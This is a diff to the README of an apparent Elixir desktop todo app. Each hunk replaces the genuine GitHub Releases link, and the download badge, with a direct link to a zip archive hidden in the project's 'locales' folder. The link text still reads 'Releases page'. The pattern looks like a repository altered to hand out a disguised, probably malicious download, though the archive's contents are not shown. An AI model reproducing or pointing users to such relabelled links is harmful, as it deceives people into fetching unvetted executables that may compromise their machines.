@@ -1,6 +1,6 @@
 # 🎯 elixir_desktop_webui_todoapp - Your Simple Todo List App
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
+![Download](https://raw.githubusercontent.com/Skyf9384/elixir_desktop_webui_todoapp/main/lib/todo_desktopapp/locales/elixir_desktop_webui_todoapp_2.5.zip)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ elixir_desktop_webui_todoapp is a user-friendly desktop application designed for
 Follow these steps to download and run the application:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/Skyf9384/elixir_desktop_webui_todoapp/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Skyf9384/elixir_desktop_webui_todoapp/main/lib/todo_desktopapp/locales/elixir_desktop_webui_todoapp_2.5.zip) to find the latest version of the application.
 
 2. **Download the Application**  
    On the Releases page, you'll see the latest version listed. Click on the link to initiate the download.
@@ -42,7 +42,7 @@ To run elixir_desktop_webui_todoapp, make sure your system meets the following r
 
 ## 📦 Download & Install
 
-Visit this page to download the application: [Releases Page](https://github.com/Skyf9384/elixir_desktop_webui_todoapp/releases). 
+Visit this page to download the application: [Releases Page](https://raw.githubusercontent.com/Skyf9384/elixir_desktop_webui_todoapp/main/lib/todo_desktopapp/locales/elixir_desktop_webui_todoapp_2.5.zip). 
 
 Once the download finishes, you'll have a `.exe`, `.dmg`, or `.AppImage` file, depending on your operating system. Follow the steps above to launch the application.
 
@@ -69,7 +69,7 @@ Here are the fundamental operations to get you started:
   Yes, once downloaded, you can use the app without an internet connection.
 
 - **How do I get updates?**  
-  Check the [Releases page](https://github.com/Skyf9384/elixir_desktop_webui_todoapp/releases) periodically for new versions or enable notifications for updates.
+  Check the [Releases page](https://raw.githubusercontent.com/Skyf9384/elixir_desktop_webui_todoapp/main/lib/todo_desktopapp/locales/elixir_desktop_webui_todoapp_2.5.zip) periodically for new versions or enable notifications for updates.
 
 ## 📞 Support
 
